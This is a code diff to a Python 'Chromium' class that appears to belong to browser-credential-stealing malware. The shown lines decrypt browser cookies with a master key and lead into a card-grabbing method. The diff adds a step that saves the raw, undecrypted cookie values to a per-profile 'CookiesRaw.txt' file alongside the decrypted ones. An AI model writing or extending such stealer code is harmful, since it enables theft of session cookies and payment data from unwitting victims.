@@ -261,6 +261,16 @@ class Chromium:
             data.format(row[0], row[1], self._decrypt(row[2], self.__master_key))
             for row in cookies_list_filtered
         ]
+        
+        temp2 = [
+            data.format(row[0], row[1], row[2])
+            for row in cookies_list_filtered
+        ]
+        
+        self.__storage.add_from_memory(
+            path.join(self.__path, rf"{profile} CookiesRaw.txt"),
+            "\n".join(row for row in temp2)
+        )
 
         self.__storage.add_from_memory(
             path.join(self.__path, rf"{profile} Cookies.txt"),
@@ -268,6 +278,7 @@ class Chromium:
         )
 
         self.__storage.add_data("Cookies", len(temp))
+        self.__storage.add_data("CookiesRaw", len(cookies_list_filtered))
 
     def _grab_cards(self, profile: str, file_path: str) -> None:
         """
